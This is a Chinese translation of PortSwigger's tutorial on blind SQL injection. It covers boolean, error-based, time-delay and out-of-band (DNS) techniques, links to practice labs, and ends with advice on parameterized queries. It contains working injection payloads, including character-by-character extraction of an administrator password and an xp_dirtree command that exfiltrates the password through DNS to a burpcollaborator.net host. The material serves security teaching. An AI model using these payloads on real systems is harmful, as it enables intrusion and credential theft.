---
description: '原文链接：https://portswigger.net/web-security/sql-injection/blind'
---

# SQL盲注

本部分，我们将描述什么是 SQL 盲注漏洞，并解释发现和利用 SQL 盲注漏洞的多种技术。

### 什么是SQL盲注？

当应用程序容易收到 SQL 注入，但其 HTTP 响应不包含相关的 SQL 查询结果或任何数据库错误的详细信息时，就会出现 SQL 盲注。

在 SQL 盲注漏洞下，许多诸如 [UNION 攻击](https://portswigger.net/web-security/sql-injection/union-attacks)之类的技术都不会起作用，这是因为这些技术都依赖于应用程序响应返回注入查询结果集。但是仍然可以利用 SQL 盲注访问未授权数据，只是必须采用不同的技术。

### 通过触发条件响应来利用SQL盲注

考虑存在一个使用追踪 cookies 来收集和分析使用情况的应用程序。对应用程序的请求包括一个 cookies 标头，如下所示：

```text
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

当处理包含 TrackingId cookie 的请求时，应用程序使用 SQL 查询来确定该用户是否为已知用户：

```text
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

此查询容易受到 SQL 注入漏洞影响，但查询结果不会返回给用户。然而，应用程序的逻辑行为会有所不同，具体取决于查询是否返回任何数据。如果返回数据（因为已提交识别的 TrackingId），则页面内将显示 “欢迎回来” 消息。

这种行为足以让我们根据注入条件有条件的触发不同的响应，从而利用 SQL 盲注漏洞检索信息。要查看其工作原理，假设我们发送了两个请求，这些请求依次包含以下 TrackingId Cookie 值：

```text
…xyz' AND '1'='1
…xyz' AND '1'='2
```

第一条请求将会返回查询结果，因为注入条件 or 1=1 为 true，页面将显示 “欢迎回来” 消息。然而第二条请求不会返回任何查询结果，因为注入条件为 false，页面不会显示 “欢迎回来” 消息。这就使得我们能够确定任何单个注入条件的答案，从而一次提取以为数据。

例如，假设数据库存在一个 users 表，该表有 username 和 password 两个列字段，表存储了用户名为 Administrator 的一条数据。通过发送一系列输入来一次测试一个字符，我们可以系统地确定该用户的 password。

为了达到上述目的，我们以如下 payload 开始测试：

```text
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

页面返回 “欢迎回来” 消息，这表明注入条件为 true，password 字段的第一个字符的值要比'm' 大。

下一步，我们发送第二条测试 payload:

```text
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

页面没有返回 “欢迎回来” 消息，这表明注入条件为 false，password 字段的第一个字符的值要小于比't' 。

最终，我们发送如下测试 payload，页面返回 “欢迎回来” 消息，这就可以确定 password 字段的第一个字符的值's'：

```text
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

通过以上步骤我们可以进一步系统地确认 Administrator 用户的完整密码。

> Note
>
> `SUBSTRING`函数在某些类型的数据库中称为`SUBSTR`。更多细节，请参见[SQL注入备忘单](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

{% hint style="warning" %}
实验：[带条件响应的SQL盲注](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
{% endhint %}

### 通过触发SQL错误来诱导条件响应

在前面的示例中，假设应用程序即使执行不同的 SQL 查询，但是根据查询返回的任何数据在行为上判断都没有不同点。这样前面的方法就失效了，因为注入不同的 boolean 条件不会影响应用程序的响应。

在这种情况下，我们通常很可能采用根据注入条件，选择性触发 SQL 错误，来诱使应用程序返回条件响应。这涉及修改查询，以便在条件为 true 时将引起数据库错误，而条件为 false 时则不会导致数据库错误。通常，数据库引发的未处理错误会导致应用程序响应有所不同，从而能使我们推断出注入条件的真实性。

要查看其工作原理，假设我们发送两个请求，这些请求依次包含以下 TrackingId cookie 值：

```text
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

这些输入使用 CASE 关键字来测试条件，并根据表达式是否为 true 来返回不同的表达式。第一条输入，表达式为 NULL，这不会有任何错误。第二条输入中，表达式为 1/0，这会触发数据库的零除错误。假设这个错误导致应用程序的 HTTP 响应有所不同，我们可以根据差异推断注入条件是否为 true。

使用这项技术，再结合之前描述的手法，就可以一次验证一个字符系统地检索数据：

```text
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

> Note
>
> 触发条件错误的方法有很多种，不同的技术使用于不同的数据库类型。更多细节，请参见[SQL注入备忘单](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

{% hint style="warning" %}
实验：[带条件错误的SQL盲注](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
{% endhint %}

### 通过触发时间延时来利用SQL盲注

在前面的示例中，假设应用程序现在捕获数据库错误并妥善处理它们。当执行注入的 SQL 查询时触发数据库错误不再导致应用程序响应中的任何差异，因此导致条件错误的上述技术将不起作用。

在这种情况下，通常有可能通过根据注入条件有条件地触发时间延迟来利用盲 SQL 注入漏洞。由于 SQL 查询通常由应用程序同步处理，因此延迟执行 SQL 查询也会延迟 HTTP 响应。这使我们可以根据收到 HTTP 响应之前花费的时间来推断注入条件的真实性。

触发时间延迟的技术与所使用的数据库类型高度相关。在 Microsoft SQL Server 上，可以使用以下类似的输入来测试条件并根据表达式是否为真触发延迟：

```text
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

这些输入中的第一个将不会触发延时，因为条件 1=2 为 false，第二个输入将触发 10 秒的延时，因为条件 1=1 为 true。

使用这项技术，我们可以通过系统地一次测试一个字符来以已描述的方式检索数据：

```text
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

> 📝Note
>
> 在SQL查询中触发时间延迟的方法有很多种，不同的技术适用于不同类型的数据库。更多细节，请参见[SQL注入备忘单](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

{% hint style="warning" %}
实验：[带时间延迟的SQL盲注](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
{% endhint %}

{% hint style="warning" %}
实验：[带时间延迟和信息检索的SQL盲注](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
{% endhint %}

### 使用带外技术（OAST）利用SQL盲注

现在，假设应用程序执行相同的 SQL 查询，但是采用异步方式处理。应用程序继续使用原始线程处理用户请求，并使用另一个线程执行使用 tracking cookie 的 SQL 查询。该查询依然容易被 SQL 注入漏洞攻击，但是到目前为止，所介绍的技术都不起作用：应用程序的响应不取决于查询是否返回任何数据，数据库是否发生错误或执行查询所花费的时间。

在这种情况下，通常有可能通过触发与我们控制的系统的带外网络交互来利用 SQL 注入漏洞。如前所述，可以根据注入的条件有条件地触发这些操作，一次推断一位信息。但是更强大的是，可以直接在网络交互本身中渗入数据。

可以使用多种网络协议来实现此目的，但是最有效的通常是 DNS。这是因为很多生产网络都允许 DNS 查询自由发出，因为它们对于生产系统的正常运行至关重要。

使用带外技术的最简单、最可靠的方法是使用 Burp [Collaborator](https://portswigger.net/burp/documentation/collaborator)。这是一台服务器，提供各种网络服务（包括 DNS）的自定义实现，并允许您检测由于将单个有效负载发送给易受攻击的应用程序而导致何时发生网络交互。 [Burp Suite Professional](https://portswigger.net/burp/pro) 内置对 Burp Collaborator 的支持，无需进行配置。

触发 DNS 查询的技术与所使用的数据库类型高度相关。在 Microsoft SQL Server 上，可以使用如下所示的输入来在指定域上引起 DNS 查找：

```text
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

这将导致数据库对以下域执行查找：

```text
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

我们可以使用 Burp Suite 的 [Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) 生成唯一的子域，并轮询 Collaborator 服务器以确认何时进行任何 DNS 查找。

{% hint style="warning" %}
实验：[带外交互的SQL盲注](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
{% endhint %}

确定了触发带外交互的方法后，我们可以使用带外通道从易受攻击的应用程序中窃取数据。例如：

```text
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

此输入读取 Administrator 用户的密码，附加唯一的 Collaborator 子域，并触发 DNS 查找。这将导致如下所示的 DNS 查找，从而允许我们查看捕获的密码：

```text
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

带外（OAST）技术是检测和利用 SQL 盲注的一种非常强大的方法，因为该方法成功的可能性很高，并且能够直接在带外通道中窃取数据。因此，即使在其他盲注利用技术确实起作用的情况下，OAST 技术也通常是首选的。

> **Note**
>
> 触发带外交互的方法有多种，不同的技术适用于不同类型的数据库。更多详情，请参见[SQL注入备忘单](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

{% hint style="warning" %}
实验：[带外数据渗出的SQL盲注](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
{% endhint %}

### 如何防止SQL盲注攻击

尽管查找和利用 SQL 盲注漏洞所需的技术与常规 SQL 注入相比有所不同且更为复杂，但是无论该漏洞是否为盲注，防止 SQL 注入所需的措施都是相同的。

与常规 SQL 注入一样，可以通过谨慎使用参数化查询来防止 SQL 盲注攻击，这可以确保用户输入不会干扰目标 SQL 查询的结构。

> 阅读更多
>
> [如何防范SQL注入](https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection)
>
> [使用Burp Suite的Web漏洞扫描器寻找SQL盲注漏洞](https://portswigger.net/burp/vulnerability-scanner)

